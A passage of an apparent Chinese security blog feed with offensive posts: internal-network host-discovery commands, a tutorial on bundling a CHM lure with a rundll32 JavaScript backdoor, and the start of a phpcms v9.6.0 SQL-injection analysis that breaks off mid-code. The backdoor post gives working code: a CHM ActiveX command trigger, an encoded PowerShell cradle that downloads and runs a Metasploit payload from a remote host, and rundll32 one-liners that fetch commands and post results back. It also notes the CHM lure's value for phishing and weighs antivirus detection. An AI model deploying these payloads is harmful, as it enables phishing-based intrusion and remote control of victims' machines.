class="keyword">in</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">do</span> <span class="built_in">start</span> /min /low telnet <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%a <span class="number">445</span></span><br></pre></td></tr></table></figure><h4 id="powershell-2"><a href="#powershell-2" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">445</span>|%&#123;echo((new‐objectNet.Sockets.TcpClient).Connect(<span class="string">"10.253.6"</span>,<span class="variable">$_</span>)) <span class="string">"<span class="variable">$_</span> is open"</span>&#125; <span class="number">2</span>&gt;<span class="literal">$null</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>..<span class="number">5</span>|%&#123;<span class="variable">$a</span>=<span class="variable">$_</span>;<span class="number">445</span>|%&#123;echo((new‐object Net.Sockets.TcpClient).Connect(<span class="string">"192.168.1.<span class="variable">$a</span>"</span>,<span class="variable">$_</span>)) <span class="string">"Port <span class="variable">$_</span> is open"</span>&#125; <span class="number">2</span>&gt;<span class="literal">$null</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">118</span>..<span class="number">119</span>|%&#123;<span class="variable">$a</span>=<span class="variable">$_</span>;write‐host<span class="string">"‐‐‐‐‐‐"</span>;write‐host <span class="string">"192.168.1.<span class="variable">$a</span>"</span>; <span class="number">80</span>,<span class="number">445</span> | % &#123;echo ((new‐object Net.Sockets.TcpClient).Con ect(<span class="string">"192.168.1.<span class="variable">$a</span>"</span>,<span class="variable">$_</span>)) <span class="string">"Port <span class="variable">$_</span> is open"</span>&#125; <span class="number">2</span>&gt;<span class="literal">$null</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="1-5-基于snmp发现主机"><a href="#1-5-基于snmp发现主机" class="headerlink" title="1.5 基于snmp发现主机"></a>1.5 基于snmp发现主机</h3><h4 id="nmap-4"><a href="#nmap-4" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script snmp-brute 192.168.1.0/24 -T4</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/62BB742B-9540-49B3-AEDB-1490A53D6143.png" alt="54f953ba0bf35bbe34623e0138e3f017"></p><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p><a href="https://github.com/dheiland-r7/snmp" target="_blank" rel="noopener">https://github.com/dheiland-r7/snmp</a><br><img src="/内网主机发现.resources/BE732D1F-6E9E-4B2A-8015-395F33CCE0A2.png" alt="7f535a08c8897275f57fb979975b1b8c"></p><h3 id="1-6-基于udp发现主机"><a href="#1-6-基于udp发现主机" class="headerlink" title="1.6 基于udp发现主机"></a>1.6 基于udp发现主机</h3><h4 id="nmap-5"><a href="#nmap-5" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500</span><br></pre></td></tr></table></figure><h4 id="unicornscan"><a href="#unicornscan" class="headerlink" title="unicornscan"></a>unicornscan</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicornscan -mU 192.168.1.100</span><br></pre></td></tr></table></figure><h3 id="1-7-基于SqlDataSourceEnumerator"><a href="#1-7-基于SqlDataSourceEnumerator" class="headerlink" title="1.7 基于SqlDataSourceEnumerator"></a>1.7 基于SqlDataSourceEnumerator</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell -Command <span class="string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/F69B4159-B3B4-4DDE-B4A3-BD483E8C1431.png" alt="db8c4d18ffad131d9641044e575fc820"></p><h3 id="1-8-基于msf发现主机"><a href="#1-8-基于msf发现主机" class="headerlink" title="1.8 基于msf发现主机"></a>1.8 基于msf发现主机</h3><h4 id="http服务"><a href="#http服务" class="headerlink" title="http服务"></a>http服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/http/http_version</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/http/title</span><br></pre></td></tr></table></figure><h4 id="smb服务"><a href="#smb服务" class="headerlink" title="smb服务"></a>smb服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure><h4 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_version</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/anonymous</span><br></pre></td></tr></table></figure><h4 id="arp服务"><a href="#arp服务" class="headerlink" title="arp服务"></a>arp服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep</span><br></pre></td></tr></table></figure><h4 id="udp服务"><a href="#udp服务" class="headerlink" title="udp服务"></a>udp服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure><h4 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_version</span><br></pre></td></tr></table></figure><h4 id="telnet服务"><a href="#telnet服务" class="headerlink" title="telnet服务"></a>telnet服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/telnet/telnet_version</span><br></pre></td></tr></table></figure><h4 id="dns服务"><a href="#dns服务" class="headerlink" title="dns服务"></a>dns服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/dns/dns_amp</span><br></pre></td></tr></table></figure><h4 id="mysql服务"><a href="#mysql服务" class="headerlink" title="mysql服务"></a>mysql服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_version</span><br></pre></td></tr></table></figure><h4 id="netbios服务"><a href="#netbios服务" class="headerlink" title="netbios服务"></a>netbios服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/netbios/nbname</span><br></pre></td></tr></table></figure><h4 id="db2服务"><a href="#db2服务" class="headerlink" title="db2服务"></a>db2服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/db2/db2_version</span><br></pre></td></tr></table></figure><h4 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/syn</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/syn</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ftpbounce</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/xmas</span><br></pre></td></tr></table></figure><h4 id="rdp服务"><a href="#rdp服务" class="headerlink" title="rdp服务"></a>rdp服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/rdp/rdp_scanner</span><br></pre></td></tr></table></figure><h4 id="smtp服务"><a href="#smtp服务" class="headerlink" title="smtp服务"></a>smtp服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smtp/smtp_version</span><br></pre></td></tr></table></figure><h4 id="pop3服务"><a href="#pop3服务" class="headerlink" title="pop3服务"></a>pop3服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/pop3/pop3_version</span><br></pre></td></tr></table></figure><h4 id="posgres服务"><a href="#posgres服务" class="headerlink" title="posgres服务"></a>posgres服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/postgres/postgres_version</span><br></pre></td></tr></table></figure><h4 id="调用nmap"><a href="#调用nmap" class="headerlink" title="调用nmap"></a>调用nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap</span><br></pre></td></tr></table></figure><h4 id="post组件"><a href="#post组件" class="headerlink" title="post组件"></a>post组件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">windows/gather/arp_scanner </span><br><span class="line">windows/gather/enum_ad_computers </span><br><span class="line">windows/gather/enum_computers </span><br><span class="line">windows/gather/enum_domain </span><br><span class="line">windows/gather/enum_domains </span><br><span class="line">windows/gather/enum_ad_user_comments</span><br><span class="line">linux/gather/enum_network </span><br><span class="line">linux/busybox/enum_hosts </span><br><span class="line">windows/gather/enum_ad_users </span><br><span class="line">windows/gather/enum_domain_tokens </span><br><span class="line">windows/gather/enum_snmp</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-02-03 11:59:32&lt;br&gt;&lt;img src=&quot;/wallpaper/[31894]from here-58445343.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>JS+CHM捆绑后门</title>
    <link href="http://patrilic.top/2019/04/03/JS%20+%20CHM%20%E6%8D%86%E7%BB%91%E5%90%8E%E9%97%A8/"/>
    <id>http://patrilic.top/2019/04/03/JS + CHM 捆绑后门/</id>
    <published>2019-04-03T03:58:32.000Z</published>
    <updated>2019-08-16T05:17:08.999Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-02-03 11:58:32<br><img src="/wallpaper/[50195]そして運命のミッドウェー海戦へ-50970709.png" alt><br>学了一波evi1cg博客上的捆绑后门，做个记录</p></blockquote><h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><blockquote><p>思路：<br>利用CHM后门调用rundll32.exe执行javascript获取恶意代码并执行</p></blockquote><blockquote><p>结果：<br>交互式shell or meterpreter（poershell）</p></blockquote><h2 id="0x02-chm后门"><a href="#0x02-chm后门" class="headerlink" title="0x02 chm后门"></a>0x02 chm后门</h2><p>calc.exe P0c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>利用EasyCHM编译html文件</p><p>运行：<br><img src="/JS + CHM 捆绑后门.resources/EA116D89-8450-42AA-81EC-147BF4AEE0B4.png" alt="1917e96c5ce843b5730a1a09cab0bfa9"></p><h2 id="0x03-JS后门"><a href="#0x03-JS后门" class="headerlink" title="0x03 JS后门"></a>0x03 JS后门</h2><p>核心思路：rundll32.exe 执行 javascript 脚本 访问C&amp;C执行恶意代码</p><p>Poc：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert</span><br><span class="line">('foo');</span><br></pre></td></tr></table></figure></p><p><img src="/JS + CHM 捆绑后门.resources/1B93425B-F900-4F41-9D44-137A3F162796.png" alt="f4f3d68173b359419c24507b1f942ec0"></p><h2 id="0x04-CHM-JS-捆绑"><a href="#0x04-CHM-JS-捆绑" class="headerlink" title="0x04 CHM + JS 捆绑"></a>0x04 CHM + JS 捆绑</h2><p>思路：<br>CHM后门 —-&gt; 调用rundll32.exe —–&gt; 调用javascript. —–&gt; 访问目标C2服务器 ——&gt;执行恶意代码  —–&gt; 交互式shell</p><p>优点：<br>防止传统CHM后门使用CMD /c 时引起的弹窗</p><p>缺点：</p><p>直接获取Meterpreter Session</p><p>使用Exploit ： exploit/multi/script/web_delivery<br><img src="/JS + CHM 捆绑后门.resources/F6F24805-822A-43A1-81E4-4EEA799D1EFC.png" alt="cacd683f6c64c4a3651f0572cdd12349"></p><p>存在特殊字符，在cmd下是不能直接运行的,使用Base64编码：<br><img src="/JS + CHM 捆绑后门.resources/8EA4EE4F-1C55-4FE0-9CEB-469FAE9AAAEB.png" alt="c54ede5591f858d718b4b01409b5aba3"></p><p>Powershell :<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA==</span><br></pre></td></tr></table></figure></p><p>But:<br><img src="/JS + CHM 捆绑后门.resources/88D944CE-B983-4554-87AF-E38163827E99.png" alt="abcd0e35e422a4dc7c13de7884d4bb7f"></p><p>并不能bypass 360主防<br>允许程序执行后，可得到JSRAT Session 以及 meterpreter Session<br><img src="/JS + CHM 捆绑后门.resources/5E78F5F9-4F29-434E-B3CD-BA3DD373D1BE.png" alt="0081d77c6169108109e646204a07b69a"></p><p>主要还是检测了rundll32.exe 这个敏感进程</p><p><img src="/JS + CHM 捆绑后门.resources/82E82E61-3559-43CF-A336-1E4B923C591D.png" alt="c4f1838a6afa2810a377bde24e717b33"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>JS后门优点：</p><ol><li>无文件落地</li><li>持续控制</li><li>后台rundll32.exe进程稳定</li></ol><p>缺点：<br>不免杀，容易被检测</p><p>CHM后门优点：<br>钓鱼强<br>不会被AV检测，只会在调用危险进程时被检测，本身不含有恶意代码</p><p>配合可以达到nishang中不弹窗的效果</p><h2 id="0x06-JS-backdoor-Tips"><a href="#0x06-JS-backdoor-Tips" class="headerlink" title="0x06 JS backdoor Tips"></a>0x06 JS backdoor Tips</h2><p>//Execute A Command<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br></pre></td></tr></table></figure></p><p>//Write To A File<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);a=fso.CreateTextFile(&quot;c:\\Temp\\testfile.txt&quot;,true);a.WriteLine(&quot;Test&quot;);a.Close();self.close;</span><br></pre></td></tr></table></figure></p><p>//Read and Execute From A File<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\Temp\\testfile.txt&quot;,1);eval((f.ReadAll()));</span><br></pre></td></tr></table></figure></p><p>//Map A Remote Share (WEBDAV)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;https://live.sysinternals.com&quot;);self.close;</span><br></pre></td></tr></table></figure></p><p>//Map A Local Share<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;\\\\Localhost\\c$&quot;);self.close;</span><br></pre></td></tr></table></figure></p><p>//Read and Execute Commands From A File<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\Temp\\Commands.txt&quot;,1);while(!f.AtEndOfStream)&#123;t=new%20ActiveXObject(&quot;WScript.Shell&quot;);t.Run(&quot;cmd%20/c%20&quot;%20+%20f.ReadLine(),null,true);&#125;;</span><br></pre></td></tr></table></figure></p><p>//Retrieve Commands From HTTP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1/a.txt&quot;,false);h.Send();B=h.ResponseText;alert(B);</span><br></pre></td></tr></table></figure></p><p>//POST results back to Server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;POST&quot;,&quot;http://127.0.0.1:8081/a.php&quot;,false);h.Send(&quot;Stuff&quot;);</span><br></pre></td></tr></table></figure></p><h2 id="0x07-Links"><a href="#0x07-Links" class="headerlink" title="0x07 Links"></a>0x07 Links</h2><p><a href="https://evi1cg.me/archives/chm_backdoor.html" target="_blank" rel="noopener">https://evi1cg.me/archives/chm_backdoor.html</a><br><a href="http://drops.wooyun.org/tips/8568" target="_blank" rel="noopener">http://drops.wooyun.org/tips/8568</a><br><a href="https://github.com/Ridter/MyJSRat" target="_blank" rel="noopener">https://github.com/Ridter/MyJSRat</a><br><a href="http://drops.wooyun.org/tips/11764" target="_blank" rel="noopener">http://drops.wooyun.org/tips/11764</a><br><a href="http://drops.wooyun.org/tips/12386" target="_blank" rel="noopener">http://drops.wooyun.org/tips/12386</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-02-03 11:58:32&lt;br&gt;&lt;img src=&quot;/wallpaper/[50195]そして運命のミッドウェー海戦へ-50970709.png&quot; alt&gt;&lt;br&gt;学了一波ev
      
    
    </summary>
    
    
      <category term="Backdoor" scheme="http://patrilic.top/tags/Backdoor/"/>
    
  </entry>
  
  <entry>
    <title>phpcms_v9.6.0 wap模块 SQL注入</title>
    <link href="http://patrilic.top/2019/04/03/phpcms_v9.6.0%20wap%E6%A8%A1%E5%9D%97%20sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://patrilic.top/2019/04/03/phpcms_v9.6.0 wap模块 sql注入/</id>
    <published>2019-04-03T02:58:32.000Z</published>
    <updated>2019-08-16T05:19:07.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>漏洞发生在 </p><blockquote><p>/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/content/down.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$a_k = trim($_GET[<span class="string">'a_k'</span>]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line"><span class="keyword">unset</span>($i,$m,$f);</span><br><span class="line">parse_str($a_k);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)||!<span class="keyword">isset</span>($catid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</span><br><span class="line">$allow_visitor = <span class="number">1</span>;</span><br><span class="line">$MODEL = getcache(<span class="string">'model'</span>,<span class="string">'commons'</span>);</span><br><span class="line">$tablename = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.$MODEL[$modelid][<span class="string">'tablename'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;table_name = $tablename.<span class="string">'_data'</span>;</span><br><span class="line">$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br></pre></td></tr></table></figure><p>$_GET 方法传入 $a_k ， 经过sys_auth 解密之后，进入 parse_str,解析到变量中<br>最后带入到</p><blockquote><p>\$rs = \$this-&gt;db-&gt;get_one(array(‘id’=&gt;$id)); 进行查询</p></blockquote><p>所以现在如果能找到一个经过sys_auth 并能回显给我payload的地方即可</p><p>/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/attachment/attachments.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</span><br><span class="line">$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</span><br><span class="line">$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</span><br><span class="line">$json_str = json_encode($arr);</span><br><span class="line">$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</span><br><span class="line">$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</span><br><span class="line"><span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</span><br><span class="line">param::set_cookie(<span class="string">'att_json'</span>,$json_str);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先经过safe_replace 函数，过滤一遍，然后存入数组，如果不满足条件进入 set_cookie函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($var, $value = <span class="string">''</span>, $time = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">$time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</span><br><span class="line">$s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">$var = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_pre'</span>).$var;</span><br><span class="line">$_COOKIE[$var] = $value;</span><br><span class="line"><span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($value <span 